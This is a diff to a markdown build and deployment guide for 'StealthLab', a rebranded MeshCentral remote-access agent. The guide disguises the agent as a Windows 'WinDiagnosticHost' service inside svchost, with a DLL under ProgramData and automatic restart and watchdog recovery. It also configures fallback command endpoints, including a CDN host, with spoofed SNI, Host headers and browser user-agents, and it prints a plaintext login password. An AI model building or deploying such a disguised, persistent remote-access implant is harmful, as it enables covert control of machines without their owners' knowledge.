@@ -1129,94 +1129,191 @@ Result: Stock agent reinstalled, custom agent NEVER used
 
 ---
 
-## ✅ THE SOLUTION
+## ✅ THE SOLUTION (Automated Native Workflow)
 
-### Step 1: Move Agents to Correct Directory
+This section documents the *supported* path for getting a freshly built StealthLab agent onto MeshCentral and proving that every download, install, and uninstall flows through the svchost helper without manual hand-editing.
 
-```powershell
-# Create correct directory
-New-Item -ItemType Directory -Force -Path "C:\Users\Workstation\Documents\GitHub\MeshCentral\meshcentral-data\agents"
+### Step 0 - Confirm live paths and config
 
-# Move agents from wrong to correct directory
-Move-Item "C:\Users\Workstation\Documents\GitHub\MeshCentral\meshcentral-data\agents-custom\MeshService.exe" `
-          "C:\Users\Workstation\Documents\GitHub\MeshCentral\meshcentral-data\agents\MeshService.exe"
+| Item | Expected Value |
+| --- | --- |
+| MeshAgent repo | `C:\Users\Workstation\Documents\GitHub\MeshAgent` |
+| MeshCentral repo | `C:\Users\Workstation\Documents\GitHub\MeshCentral` |
+| Live data path | `C:\Users\Workstation\Documents\GitHub\meshcentral-data` (sibling folder, **not** `MeshCentral\meshcentral-data`) |
 
-Move-Item "C:\Users\Workstation\Documents\GitHub\MeshCentral\meshcentral-data\agents-custom\MeshService64.exe" `
-          "C:\Users\Workstation\Documents\GitHub\MeshCentral\meshcentral-data\agents\MeshService64.exe"
-```
-
-### Step 2: Fix Configuration
-
-**File:** `meshcentral-data/config.json` (or config.template.json)
+Update `meshcentral-data\config.json` so the server trusts the signed binaries and refuses to back-fill stock agents:
 
 ```json
 {
   "settings": {
-    "agentUpdateSystem": 0,  // ← CHANGE FROM 2 TO 0! (Disable auto-update OR set to 1 for native)
-    "agentsInRam": true,
-    "agentSignLock": true
+    "agentSkipServerSign": true,
+    "agentSignLock": true,
+    "ignoreagenthashcheck": false,
+    "noagentupdate": 1,
+    "agentsInRam": true
   }
 }
 ```
 
-**Options for agentUpdateSystem:**
-- `0` = Disable auto-update (agents never updated)
-- `1` = Native update (agent updates itself)
-- `2` = MeshCore update (server pushes update) ← **YOU HAD THIS, IT'S WRONG!**
+> `agentSkipServerSign` keeps MeshCentral from re-signing or editing the staged binaries, `agentSignLock` prevents another instance from serving unsigned payloads, and `ignoreagenthashcheck:false` forces hash parity between `meshcentral-data\agents` and live downloads.
 
-### Step 3: Delete Signed Agents Cache
+### Step 1 - Build + sign the StealthLab payload
 
 ```powershell
-# Remove old signed agents so MeshCentral regenerates from your custom agents
-Remove-Item -Recurse -Force "C:\Users\Workstation\Documents\GitHub\MeshCentral\meshcentral-data\signedagents" -ErrorAction SilentlyContinue
+pwsh .\build.ps1 -StealthLab -SkipTests -SignStealth `
+     -BinaryPath 'meshservice\x64\StealthLab\MeshService-2022.exe'
 ```
 
-### Step 4: Restart MeshCentral
+This regenerates the branding headers, embeds the svchost DLL, signs `MeshService64.exe`, and emits the `.msh` manifest (`WinDiagnosticHost.msh`) that MeshCentral must distribute.
+
+### Step 2 - Stage directly into `meshcentral-data\agents`
 
 ```powershell
-# Stop MeshCentral
-Stop-Process -Name "node" -Force -ErrorAction SilentlyContinue
-
-# Start MeshCentral
-cd "C:\Users\Workstation\Documents\GitHub\MeshCentral"
-node meshcentral
+pwsh .\tools\stage_meshcentral_agents.ps1 `
+     -MeshCentralDataPath '..\meshcentral-data' `
+     -IncludeWin32
 ```
 
-### Step 5: Verify Agent Loading
+What this does:
+1. (Optionally) rebuilds StealthLab so hashes match the freshly signed binaries.
+2. Copies `MeshService64.exe`, `MeshService.exe` (when `-IncludeWin32`), and `WinDiagnosticHost.msh` into `meshcentral-data\agents\`.
+3. Mirrors the executables into `meshcentral-data\signedagents\` so MeshCentral loads the updated copy even when the signing cache is enabled.
+4. Prints the before/after SHA256 values so you can paste them into release notes.
 
-**Check MeshCentral startup logs for:**
-```
-MeshCentral HTTP redirection server running on port 80.
-MeshCentral v1.1.53, Hybrid (LAN + WAN) mode, Production mode.
-MeshCentral Intel(R) AMT server running on agents.high.support:4433.
-MeshCentral HTTP server running on port 443, aliases: agents.high.support.
-MeshCentral agent server running on agents.high.support:4445.
-Loaded agent #4, MeshService64.exe, 13466624 bytes.  ← SHOULD BE 13.4 MB NOW!
-```
+### Step 3 - Restart MeshCentral (or let the runtime helper do it)
 
-**If still shows 3.3 MB:**
-- Your agents are still in wrong location
-- MeshCentral cached old binaries in RAM
-- Need to clear RAM cache by restarting
-
-### Step 6: Verify Hash
-
-**Get server's expected hash:**
-```bash
-cd /opt/meshcentral
-node -e "const mc = require('./meshcentral'); console.log(mc.parent.meshAgentBinaries[4].fileHashHex);"
+```powershell
+$proc = Get-CimInstance Win32_Process -Filter "CommandLine LIKE '%meshcentral.js%'"
+if ($proc) { $proc | ForEach-Object { Stop-Process -Id $_.ProcessId -Force } }
+Start-Process -FilePath node `
+    -ArgumentList 'meshcentral.js' `
+    -WorkingDirectory '..\MeshCentral' `
+    -WindowStyle Minimized
+Start-Sleep 3
 ```
 
-**Compare with your custom agent:**
-```bash
-sha384sum meshcentral-data/agents/MeshService64.exe
+Restarting flushes the in-memory cache and forces MeshCentral to re-read `meshcentral-data\agents`.
+You can skip this manual block when you run the runtime helper in the next step because it already kills and relaunches `node meshcentral.js`.
+
+### Step 4 - Run zero-touch runtime validation
+
+```powershell
+pwsh .\tools\Invoke-RuntimeValidation.ps1 `
+     -MeshCentralRepo '..\MeshCentral' `
+     -BinaryPath 'meshservice\x64\StealthLab' `
+     -ReportPath 'verification\phase3\runtime.json' `
+     -LogPath 'verification\phase3\runtime.log'
 ```
 
-**They MUST match!**
+`Invoke-RuntimeValidation` performs the following automatically:
+1. Restarts MeshCentral and wipes cached downloads (`diaghost.exe64-WindowsDiagnostics.exe`).
+2. Verifies that `meshcentral-data\agents\MeshService64.exe` matches the local StealthLab build.
+3. Fetches a fresh agent via `meshctrl AgentDownload`.
+4. Runs the elevated install/uninstall flow (`test.ps1 -RuntimeValidation`) and fails if the service registers outside svchost, if the watchdog/service recovery config is missing, or if MeshCentral serves a mismatched hash.
+
+### Step 5 - Capture evidence + publish
+
+- Archive `verification\phase3\runtime.json` and `verification\phase3\runtime.log`.
+- Copy `dist\MeshAgent_Stealth_<timestamp>\` (executables, `.msh`, manifests, hashes) wherever release managers expect it.
+- Update `MeshCentral\deployment-configs\RELEASE_NOTES_YYYY-MM-DD.md` with the new hashes and reference the commands above so ops can replay the workflow.
+
+### Step 6 - Remote/air-gap deployments
+
+When staging to a remote MeshCentral instance:
+
+```powershell
+$session = New-PSSession -HostName mesh.central.example -UserName deploy
+Copy-Item meshservice\x64\StealthLab\MeshService-2022.exe `
+          -Destination "/opt/meshcentral/meshcentral-data/agents/MeshService64.exe" `
+          -ToSession $session -Force
+Copy-Item WinDiagnosticHost.msh `
+          -Destination "/opt/meshcentral/meshcentral-data/agents/MeshService-2022.msh" `
+          -ToSession $session -Force
+```
+
+Or use `scp`/`rsync`, but always target `meshcentral-data/agents/` and repeat the restart + validation steps on that host.
+
+### Network fallback + firewall checklist
+
+1. **Single active connection, ordered fallbacks.** `meshcore/agentcore.c` now walks `branding.network.primaryEndpoint` followed by `fallbackEndpoints[]`. Configure every entry (primary plus fallbacks) inside `branding_config.local.json` or the `.msh` so we never need runtime edits.
+2. **Per-endpoint overrides.** Each fallback entry accepts `url`, `sni`, `hostHeader`, `userAgent`, `alpn`, and `proxy` booleans. Example:
+
+    ```json
+    "network": {
+      "primaryEndpoint": { "url": "wss://agents.high.support:4445/agent.ashx" },
+      "fallbackEndpoints": [
+        { "url": "wss://dr.high.support:4445/agent.ashx", "sni": "dr.high.support", "hostHeader": "dr.high.support" },
+        { "url": "wss://cdn.high.support/agent.ashx", "sni": "cdn.high.support", "hostHeader": "cdn.high.support", "userAgent": "Mozilla/5.0", "alpn": ["h2","http/1.1"] }
+      ]
+    }
+    ```
+
+3. **Firewall exceptions.** Allow outbound 443/4445 (or whatever the `url` specifies) to every hostname/IP listed above. The installer already adds Windows Firewall rules for `svchost.exe`, but perimeter firewalls still need these ranges.
+4. **Proxy-aware posture.** If an environment forces egress through a proxy, set `network.useProxy=true` in branding. The agent automatically reuses WebProxy settings and still rotates fallback hosts after the proxy handshake.
+5. **Monitoring.** Runtime logs (and `Invoke-RuntimeValidation`) now print the fallback ordinal + hostname when failover occurs. Capture those logs so SOC teams can correlate them with firewall blocks.
 
 ---
 
 ## 📋 VERIFICATION CHECKLIST
+
+### Server preflight
+
+1. `Get-Item ..\meshcentral-data\agents\MeshService64.exe | Select-Object Length, LastWriteTime` - expect ~13.4 MB and the current timestamp.
+2. `Get-FileHash ..\meshcentral-data\agents\MeshService64.exe -Algorithm SHA256` - compare against the build manifest.
+3. `Test-Path ..\meshcentral-data\signedagents\MeshService64.exe` - MeshCentral should mirror the staged binary immediately after the first download.
+
+### Config sanity
+
+```powershell
+Get-Content ..\meshcentral-data\config.json | ConvertFrom-Json |
+    Select-Object -ExpandProperty settings |
+    Select agentSkipServerSign, agentSignLock, ignoreagenthashcheck, noagentupdate
+```
+
+Verify the values are `True, True, False, 1` respectively.
+
+### MeshCentral download parity
+
+1. Run `pwsh .\tools\Invoke-RuntimeValidation.ps1 ...` (see Step 4).
+2. Confirm the helper reports `MeshCentral Binary Matches StealthLab`.
+3. If you need a manual spot-check, execute:
+
+   ```powershell
+   node ..\MeshCentral\meshctrl.js AgentDownload `
+        --loginuser diagadmin --loginpass 'DiagTest!23' `
+        --url ws://127.0.0.1:3000 --id <MeshID> --type 4 `
+        --out .\out\diaghost.exe64-WindowsDiagnostics.exe
+   Get-FileHash .\out\diaghost.exe64-WindowsDiagnostics.exe -Algorithm SHA256
+   ```
+
+   Compare the hash with `meshservice\x64\StealthLab\MeshService-2022.exe`.
+
+### Client/runtime verification
+
+1. Allow `Invoke-RuntimeValidation` to finish. It already uninstalls/reinstalls the agent, checks the svchost service type, validates watchdog/service recovery, and asserts that the standalone service remains disabled.
+2. Review `verification\phase3\runtime.json` for:
+   - `MeshCentral Binary Matches StealthLab`
+   - `Service Type` = `SERVICE_WIN32_SHARE_PROCESS`
+   - `SCM Recovery Actions` showing Restart/Reset intervals that mirror branding.
+3. Spot-check the Windows service:
+
+   ```powershell
+   Get-Service WinDiagnosticHost | Select-Object Status, StartType, ServiceType
+   ```
+
+   Expect `Stopped`, `Disabled`, `Win32ShareProcess`.
+
+4. Validate the svchost DLL hash on disk:
+
+   ```powershell
+   Get-FileHash 'C:\ProgramData\DiagnosticHost\diagsvc.dll' -Algorithm SHA256
+   ```
+
+### Fallback/resilience validation
+
+- Ensure `branding_config.local.json` (or the `.msh`) contains at least two `fallbackEndpoints`.
+- Block the primary hostname temporarily (firewall or hosts file) and re-run `Invoke-RuntimeValidation.ps1 -SkipMeshCentralPreflight` to watch the logs rotate to `Fallback[1]`.
+- Archive the resulting `runtime.log` with the release so ops can prove fallback behavior was exercised.## 📋 VERIFICATION CHECKLIST
 
 After fixing, verify each step:
 
@@ -1569,3 +1666,5 @@ If you still have issues after this, the problem is likely:
 ---
 
 **END OF DOCUMENT**
+
+
